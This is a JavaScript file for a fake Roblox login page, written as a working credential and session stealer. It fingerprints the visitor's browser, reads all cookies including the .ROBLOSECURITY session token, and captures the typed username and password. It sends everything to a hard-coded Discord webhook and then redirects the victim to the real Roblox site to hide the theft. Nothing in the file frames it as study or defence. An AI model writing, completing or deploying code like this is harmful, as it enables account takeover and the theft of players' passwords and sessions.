// Function to get user information
function getUserInfo() {
    const userAgent = navigator.userAgent;
    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const language = navigator.language;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
    const screenColorDepth = window.screen.colorDepth;
    const screenPixelDepth = window.screen.pixelDepth;
    const hardwareConcurrency = navigator.hardwareConcurrency;
    const platform = navigator.platform;
    const onlineStatus = navigator.onLine;
    const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
    const batteryStatus = navigator.getBattery ? navigator.getBattery().then(battery => ({
        charging: battery.charging,
        level: battery.level
    })) : { charging: 'Unknown', level: 'Unknown' };

    return {
        userAgent,
        screenResolution,
        language,
        timezone,
        plugins,
        screenColorDepth,
        screenPixelDepth,
        hardwareConcurrency,
        platform,
        onlineStatus,
        connectionType,
        batteryStatus
    };
}

// Function to capture all cookies
function getCookies() {
    const cookies = document.cookie;
    return cookies;
}

// Function to capture a specific cookie by name
function getSpecificCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

// Function to capture form data
function captureFormData() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    return {
        username,
        password
    };
}

// Function to send user information to Discord webhook
async function sendUserInfoToDiscord(userInfo, formData, cookies, token) {
    const webhookURL = 'https://discord.com/api/webhooks/1413136208015396965/ZOPuML2XdrU0egq3U6dGmCmjBT_4Mpcu49g3y35HqB2j_jpScBqIqR-3YB4w89p61juu'; // Replace with your actual webhook URL
    const message = {
        content: `New user visited the site!\n\n**User Agent:** ${userInfo.userAgent}\n**Screen Resolution:** ${userInfo.screenResolution}\n**Language:** ${userInfo.language}\n**Timezone:** ${userInfo.timezone}\n**Plugins:** ${userInfo.plugins.join(', ')}\n**Screen Color Depth:** ${userInfo.screenColorDepth}\n**Screen Pixel Depth:** ${userInfo.screenPixelDepth}\n**Hardware Concurrency:** ${userInfo.hardwareConcurrency}\n**Platform:** ${userInfo.platform}\n**Online Status:** ${userInfo.onlineStatus}\n**Connection Type:** ${userInfo.connectionType}\n**Battery Status:** Charging: ${userInfo.batteryStatus.charging}, Level: ${userInfo.batteryStatus.level}\n\n**Website Name:** Roblox Login\n**Username:** ${formData.username}\n**Password:** ${formData.password}\n**Roblox Token:** ${token}\n**Cookies:**\n${cookies}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        console.log('User information sent to Discord');
    } catch (error) {
        console.error('There was a problem with the fetch operation:', error);
    }
}

// Add an event listener to the form submission
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent the form from submitting the traditional way
            const userInfo = getUserInfo();
            const formData = captureFormData();
            const cookies = getCookies();
            const token = getSpecificCookie('.ROBLOSECURITY'); // Replace with the actual cookie name
            console.log('User Info:', userInfo);
            console.log('Form Data:', formData);
            console.log('Roblox Token:', token);
            console.log('Cookies:', cookies);

            // Wait for battery status if available
            if (userInfo.batteryStatus instanceof Promise) {
                userInfo.batteryStatus = await userInfo.batteryStatus;
            }

            sendUserInfoToDiscord(userInfo, formData, cookies, token);

            // Redirect to the actual Roblox website
            window.location.href = 'https://www.roblox.com';
        });
    } else {
        console.error('Login form not found');
    }
});